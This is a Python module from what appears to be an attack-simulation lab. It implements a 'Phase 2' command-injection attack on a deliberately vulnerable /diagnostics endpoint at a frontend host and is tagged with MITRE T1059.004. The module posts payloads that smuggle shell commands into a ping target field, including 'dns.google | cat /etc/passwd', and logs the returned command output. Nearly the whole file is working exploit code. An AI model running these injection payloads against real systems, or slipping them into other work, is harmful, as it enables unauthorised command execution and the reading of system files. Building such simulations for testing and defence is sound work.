#!/usr/bin/env python3
"""
Phase 2: Command Injection Attacks
Executes OS commands via the vulnerable diagnostics endpoint.

MITRE ATT&CK: T1059.004 — Command and Scripting Interpreter: Unix Shell
"""

import logging

from .base_attacker import BaseAttacker

logger = logging.getLogger(__name__)


class CommandInjection(BaseAttacker):
    """Demonstrates command injection via the frontend /diagnostics endpoint."""

    def __init__(self, frontend_url: str = "http://frontend:3000") -> None:
        super().__init__(frontend_url)

    def execute_commands(self) -> None:
        """Phase 2: Command Injection Attacks via Diagnostics Endpoint."""
        logger.info("\n[COMMAND INJECTION] Attempting command execution via diagnostics endpoint...")

        injection_payloads = [
            "8.8.8.8 | pwd",
            "google.com.com | ls -la",
            "dns.google | cat /etc/passwd",
        ]

        for payload in injection_payloads:
            logger.info("-" * 50)
            logger.info("Testing payload: '%s' → %s/diagnostics", payload, self.frontend_url)

            try:
                response = self.session.post(
                    f"{self.frontend_url}/diagnostics",
                    json={"system_check": "ping", "target_host": payload},
                    headers={"Content-Type": "application/json"},
                )

                if response.status_code == 200:
                    result = response.json()
                    if result.get("success"):
                        logger.info("✅ Command executed successfully!")
                        logger.info("   Command: %s", result.get("command", "Unknown"))
                        logger.info("   Output: %s", result.get("output", "No output")[:200])
                    else:
                        logger.warning("❌ Command failed: %s", result.get("error", "Unknown error"))
                else:
                    logger.warning("❌ HTTP %s: %s", response.status_code, response.text[:100])
            except Exception as e:
                logger.error("❌ Request failed: %s", e)

            logger.info("-" * 50)
        logger.info("-" * 50)
